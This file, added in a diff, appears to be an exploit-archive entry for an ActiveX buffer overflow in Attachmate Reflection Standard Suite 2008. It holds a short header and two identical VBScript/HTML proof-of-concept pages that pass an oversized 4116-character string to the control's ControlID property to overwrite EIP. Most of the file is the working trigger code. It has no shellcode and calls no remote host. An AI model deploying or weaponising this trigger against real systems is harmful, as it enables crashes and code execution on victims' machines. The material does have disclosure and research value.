@@ -1,0 +1,65 @@
+# Exploit Title: Attachmate Reflection Standard Suite 2008 activex buffer overflow
+# Date: Mar 11, 2010 found
+# Author: Rad L. Sneak (JB)
+# Software Link: http://www.attachmate.com/Evals/ruo2/eval-form.htm
+# Version: 13.0 & 14.0
+# Tested on: WinXP SP3 & Win7 64bit
+# CVE : None yet
+
+
+Attachmate Reflection Standard Suite 2008 & Reflection X Both contain a buffer overflow that could be triggered via activex. when r2axctrl.ocx is sent large string to the Reflection for UNIX & OpenVMS control class a crash happens that overwrites EIP with 41414141. 
+
+
+# Code : [PoC exploit below]
+______________________________________________________________________________
+<html>
+PoC1
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:15B168B2-AD3C-11D1-A8D8-00A0C9200E61' id='target' />
+<script language='vbscript'>
+
+'Wscript.echo typename(target)
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\ReflectionsX\r2axctrl.ocx"
+prototype  = "Property Let ControlID As String"
+memberName = "ControlID"
+progid     = "R2AXCTRLLib.R2winCtrl"
+argCount   = 1
+
+arg1=String(4116, "A")
+
+target.ControlID = arg1
+
+</script></job></package></html>
+
+___________________________________________________________________________________
+May need to throw a refresh to trigger PoC2 completely
+__________________________________________________________________________________
+<html>
+PoC2
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:15B168B2-AD3C-11D1-A8D8-00A0C9200E61' id='target' />
+<script language='vbscript'>
+
+'Wscript.echo typename(target)
+
+'for debugging/custom prolog
+targetFile = "C:\Program Files\ReflectionsX\r2axctrl.ocx"
+prototype  = "Property Let ControlID As String"
+memberName = "ControlID"
+progid     = "R2AXCTRLLib.R2winCtrl"
+argCount   = 1
+
+arg1=String(4116, "A")
+
+target.ControlID = arg1
+
+</script></job></package></html>
+
+___________________________________________________________________________________________
+
+
+
